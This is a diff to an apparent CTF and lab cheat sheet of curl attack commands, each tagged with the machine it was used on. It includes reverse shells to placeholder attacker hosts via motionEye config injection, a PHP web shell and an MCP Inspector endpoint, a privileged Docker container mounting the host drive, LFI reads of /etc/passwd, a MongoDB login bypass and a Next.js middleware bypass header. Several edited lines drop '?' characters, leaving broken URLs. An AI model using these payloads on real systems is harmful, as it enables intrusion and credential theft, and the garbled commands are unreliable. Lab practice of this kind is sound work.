@@ -79,9 +79,9 @@ Used on: **DevArea**
 
 ### motionEye config injection through API
 ```bash
-curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
-curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
+curl "http://127.0.0.1:7999/1/config/setpicture_output=on"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
+curl "http://127.0.0.1:7999/1/config/setemulate_motion=on"
 ```
 Used on: **CCTV**
 
@@ -100,7 +100,7 @@ curl http://DOCKER_HOST_IP:2375/version
 curl http://DOCKER_HOST_IP:2375/containers/json
 
 curl -X POST -H "Content-Type: application/json" \
-  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
+  http://DOCKER_HOST_IP:2375/containers/createname=pwned \
   -d '{"Image":"alpine:latest","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/mnt/host/c/:/mnt/windows"]}}'
 
 curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
@@ -138,9 +138,9 @@ Used on: **Overwatch**
 curl "http://$TARGET/assets/index.php?cmd=whoami"            # base64 reply -> pipe through `base64 -d`
 curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
 ```
-Used on: **Yueiua** — every space `%20`, every `&` `%26`, every `?` `%3F`. See [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
+Used on: **Yueiua** — every space `%20`, every `&` `%26`, every `` `%3F`. See [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
 
-### Hidden-API LFI via `?show=`
+### Hidden-API LFI via `show=`
 ```bash
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/home/sid/.bash_history"
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/etc/passwd"
@@ -192,3 +192,50 @@ Used on: **bsidesgtdav** - uploaded a test file and then the PHP reverse shell t
 curl http://$TARGET/dev/rev.php
 ```
 Used on: **coldvvars** - triggered the PHP payload after writing it into the web-accessible SMB-backed path.
+
+### JSON registration and NoSQL login bypass probes
+```bash
+curl -X POST http://$TARGET/admin/register \
+  -H "Content-Type: application/json" \
+  -d '{"username": "test123", "password": "test123", "email": "test@test.com"}'
+
+curl -X POST http://$TARGET/admin \
+  -H "Content-Type: application/json" \
+  -d '{"username": "dave", "password": {"$ne": ""}}' -v
+```
+Used on: **davesblog** - confirmed registration behavior and exploited MongoDB operator injection in the login request.
+
+### Next.js middleware and React2Shell probes
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  http://$TARGET:3000/dashboard
+
+curl -X POST http://$TARGET:3000/ \
+  -H "Content-Type: multipart/form-data" \
+  -H "Next-Action: abc123"
+```
+Used on: **Reactor** - ruled out middleware bypass and confirmed the React2Shell 500/digest oracle.
+
+### MCP endpoint command execution
+```bash
+curl -X POST http://$TARGET:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
+
+curl -X POST http://$TARGET:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'
+```
+Used on: **DevHub** - triggered blind command execution through MCPJam Inspector.
+
+### Local Node.js inspector discovery
+```bash
+curl -s http://127.0.0.1:9229/json
+```
+Used on: **Reactor** - retrieved the V8 inspector WebSocket URL for local privilege escalation.
+
+### SQLi error probe
+```bash
+curl http://flower.shop/search.php?q=%27
+```
+Used on: **flower** - triggered a SQL syntax error that confirmed the search parameter reached a MySQL query.
